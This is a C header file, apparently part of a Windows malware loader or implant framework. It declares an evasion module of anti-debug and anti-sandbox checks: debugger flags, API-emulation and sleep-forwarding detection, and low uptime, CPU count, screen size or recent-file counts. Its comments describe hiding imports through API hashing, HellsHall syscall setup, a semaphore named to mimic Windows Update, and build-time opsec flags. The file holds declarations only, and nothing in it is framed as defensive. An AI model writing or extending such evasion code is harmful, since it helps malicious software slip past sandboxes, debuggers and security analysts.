#pragma once

#include <Windows.h>
#include "..\Engine\OpsecFlags.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ==========================================================================
 *  Evasion.h — Anti-debug and anti-sandbox detection
 *
 *  All checks use GetProcAddressH (API hashing) — no plaintext import names.
 *  Requires ApiHashing_InitHashes() to have been called first.
 *  Does NOT require Syscalls_Init() — safe to call before HellsHall setup.
 *
 *  Checks are individually toggleable at build time via EVASION_FLAG_NO_*
 *  bits in the flags DWORD (same field as OPSEC_FLAG_*).  RunChecks and
 *  HammerDelay both take this flags value and skip disabled checks.
 * ========================================================================== */

/* ── Individual check functions ─────────────────────────────────────────── */

/* PEB->BeingDebugged, NtGlobalFlag, heap ForceFlags,
 * NtQueryInformationProcess(ProcessDebugPort). */
BOOL Evasion_CheckDebugger(void);

/* Resolves RtlComputeCrc32 from ntdll and verifies identity behaviour
 * (CRC of 0 bytes == initial seed).  Missing or wrong == emulated. */
BOOL Evasion_CheckAPIEmulation(void);

/* Creates named semaphore; ERROR_ALREADY_EXISTS == prior instance.
 * pSemName: semaphore name to use; NULL or "" → default "wuauctl". */
BOOL Evasion_CheckExecControl(const char* pSemName);

/* Calls Sleep(ms) and measures elapsed time via GetTickCount64.
 * Returns TRUE if < 90% of ms elapsed (sandbox fast-forwarded the sleep).
 * ms: sleep duration; 0 → default 500 ms. */
BOOL Evasion_CheckSleepForwarding(DWORD ms);

/* Returns TRUE if system uptime is below the given threshold.
 * minutes: threshold in minutes; 0 → default 2 minutes. */
BOOL Evasion_CheckUptime(DWORD minutes);

/* Returns TRUE if logical processor count is below 2. */
BOOL Evasion_CheckCpuCount(void);

/* Returns TRUE if screen width is <= 1024 pixels (800x600 / 1024x768
 * are the two most common sandbox resolutions).
 * Skipped silently if user32.dll is not already loaded. */
BOOL Evasion_CheckScreenResolution(void);

/* Queries HKCU\...\Explorer\RecentDocs subkey count.
 * Returns TRUE if fewer than 5 extension subkeys exist (fresh/fake user).
 * Skipped silently if advapi32.dll is not already loaded. */
BOOL Evasion_CheckRecentFiles(void);

/* ── Orchestration ──────────────────────────────────────────────────────── */

/* RunChecks: runs all non-disabled checks and returns TRUE if a sandbox
 * or debugger is detected.
 *
 *  Hard checks (one positive → immediate TRUE):
 *    CheckDebugger, CheckAPIEmulation, CheckExecControl, CheckSleepForwarding
 *
 *  Soft checks (need ≥ 2 to return TRUE — reduces false positives):
 *    CheckUptime, CheckCpuCount, CheckScreenResolution, CheckRecentFiles
 *
 *  flags:      the opsecFlags DWORD from .rsrc metadata.  Any EVASION_FLAG_NO_*
 *              bit disables the corresponding check.  EVASION_FLAG_NO_ALL skips
 *              all checks and returns FALSE immediately.
 *  pSemName:   semaphore name for exec-ctrl; NULL or "" → default "wuauctl".
 *  sleepFwdMs: sleep duration for sleep-fwd check (ms); 0 → default 500 ms.
 *  uptimeMin:  uptime threshold (minutes); 0 → default 2 minutes. */
BOOL Evasion_RunChecks(DWORD flags, const char* pSemName, DWORD sleepFwdMs, DWORD uptimeMin);

/* HammerDelay: burns dwMilliseconds of real wall-clock time via
 * VirtualAlloc/VirtualFree pairs timed by GetTickCount64.
 * Skipped (returns immediately) when EVASION_FLAG_NO_HAMMER or
 * EVASION_FLAG_NO_ALL is set in flags. */
void Evasion_HammerDelay(DWORD dwMilliseconds, DWORD flags);

#ifdef __cplusplus
}
#endif
